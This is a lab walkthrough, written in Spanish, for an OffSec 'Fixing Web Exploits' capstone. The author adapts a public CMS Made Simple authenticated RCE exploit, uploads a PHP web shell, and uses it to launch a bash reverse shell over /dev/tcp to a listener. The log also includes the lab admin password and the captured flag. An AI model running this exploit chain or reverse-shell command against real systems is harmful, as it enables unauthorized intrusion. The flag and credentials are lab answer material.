# Walk : Fixing Exploits - Fixing Web Exploits - Module Exercise VM #1 

## Fecha: 12/06/2025
## Host: Linux
## IP: 192.168.161.52
## Objetivo
Capstone Lab: To put in practice what we learned so far, here is the full vulnerable CMS Made Simple. 
You recovered the credentials for the admin on this service who is the user offsec with the password lFEZK1vMpzeyZ71e8kRRqXrFAs9X16iJ. 
Use this information to exploit the service on VM 1 that is running on http://[IP_ADDRESS]/cmsms and read /home/flag.txt to solve this challenge.

## Procedimiento y comandos

#### Paso 1: Arreglamos el script a nuestras necesidades:

1. Modificamos la variable **base_url** con nuestro traget

* base_url = "http://192.168.161.52/cmsms/admin"

2. Modificamos las variables username y password por defecto con las que se nos proveen en el capstone

* Username = offsec
* password = "lFEZK1vMpzeyZ71e8kRRqXrFAs9X16iJ"

3. Agregamos en la funcion **authenticate** un punto de debuging:
```bash
print "[*] Location header: {}".format(response.headers.get('Location', 'None'))
```
4. Modificamos la variable **csrf_param**

* csrf_param = "_sk_"

5. Modificamos la funcion parse_csrf_token:
```bash
def parse_csrf_token(location):
    if csrf_param + "=" in location:
        return location.split(csrf_param + "=")[1].split("&")[0]
    else:
        print "[-] CSRF token not found in location header"
        return None
```
#### Flujo de prueba y error completo:

```bash
┌──(root㉿kali)-[/home/…/14-FixingExploits/02-WebExploits/Capstones/01_Cap]
└─# python2 44976_fixed_cap.py
[+] Authenticated successfully with the supplied credentials
[*] Location header: http://192.168.161.52/cmsms/admin?_sk_=393c7b7c7c19aed6eef
Traceback (most recent call last):
  File "44976_fixed_cap.py", line 104, in <module>
    run()
  File "44976_fixed_cap.py", line 95, in run
    cookies,csrf_token = authenticate()
  File "44976_fixed_cap.py", line 39, in authenticate
    return response.cookies, parse_csrf_token(response.headers['Location'])
  File "44976_fixed_cap.py", line 24, in parse_csrf_token
    return location.split(csrf_param + "=")[1]
IndexError: list index out of range

┌──(root㉿kali)-[/home/…/14-FixingExploits/02-WebExploits/Capstones/01_Cap]
└─# nano 44976_fixed_cap.py
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/…/14-FixingExploits/02-WebExploits/Capstones/01_Cap]
└─# python2 44976_fixed_cap.py
[+] Authenticated successfully with the supplied credentials
[*] Location header: http://192.168.161.52/cmsms/admin?_sk_=393c7b7c7c19aed6eef
Traceback (most recent call last):
  File "44976_fixed_cap.py", line 104, in <module>
    run()
  File "44976_fixed_cap.py", line 95, in run
    cookies,csrf_token = authenticate()
  File "44976_fixed_cap.py", line 39, in authenticate
    return response.cookies, parse_csrf_token(response.headers['Location'])
  File "44976_fixed_cap.py", line 24, in parse_csrf_token
    return location.split(csrf_param + "=")[1]
IndexError: list index out of range
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/…/14-FixingExploits/02-WebExploits/Capstones/01_Cap]
└─# nano 44976_fixed_cap.py
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/…/14-FixingExploits/02-WebExploits/Capstones/01_Cap]
└─# python2 44976_fixed_cap.py
[+] Authenticated successfully with the supplied credentials
[*] Location header: http://192.168.161.52/cmsms/admin?_sk_=b4e217c2d4046d5dc53
[*] Attempting to upload cmsmsrce.txt...
[+] Successfully uploaded cmsmsrce.txt
[*] Attempting to copy cmsmsrce.txt to shell.php...
[+] File copied successfully
[+] Exploit succeeded, shell can be found at: http://192.168.161.52/cmsms/uploads/shell.php                                              

```
#### Paso 2: Obtenemos un reverse shell:
1. Con nc escuchando en el puerto 4444 ejecutamos:
```bash
┌──(root㉿kali)-[/home/…/14-FixingExploits/02-WebExploits/Capstones/01_Cap]
└─# curl "http://192.168.161.52/cmsms/uploads/shell.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/192.168.45.213/4444%200%3E%261'"

```
2. En el receptor
```bash
┌──(root㉿kali)-[/home/kali/OffSec/14-FixingExploits/02-WebExploits]
└─# nc -lvnp 4444                        
listening on [any] 4444 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.161.52] 59702
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@82bc94b327af:/var/www/html/cmsms/uploads$ 
```
#### Obtenemos el flag:

```bash
www-data@82bc94b327af:/var/www/html/cmsms/uploads$ cd /
cd /
www-data@82bc94b327af:/$ cd home
cd home
www-data@82bc94b327af:/home$ ls
ls
flag.txt
www-data@82bc94b327af:/home$ cat flag.txt
cat flag.txt
OS{3b3bd6e155c59a8f18fec11c345e2836}
www-data@82bc94b327af:/home$ 
```

## Troubleshooting
* El script esta en **python2**


